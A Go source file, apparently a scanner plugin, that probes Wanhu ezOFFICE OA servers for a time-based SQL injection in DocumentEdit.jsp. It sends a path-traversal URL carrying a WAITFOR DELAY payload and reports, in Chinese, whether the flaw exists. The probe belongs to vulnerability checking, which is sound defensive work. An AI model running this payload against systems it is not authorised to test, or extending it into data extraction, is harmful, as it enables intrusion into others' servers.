package wanhu_ezoffice_documentedit_sql

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(8 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:5'--"
	startTime := time.Now()
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).
		Get(vulnUrl)
	responseTime := time.Since(startTime)

	if err == nil && resp.StatusCode == 200 && responseTime > 5*time.Second {
		body := resp.String()
		if strings.Contains(body, "iSignature") {
			return true
		}
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		cheurl := url + "/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:5'--"
		color.Green.Println("[+01] 万户OA DocumentEdit.jsp SQL注入漏洞存在 -> ", cheurl)
	} else {
		color.Red.Println("[+01] 万户OA DocumentEdit.jsp SQL注入漏洞不存在")
	}

}
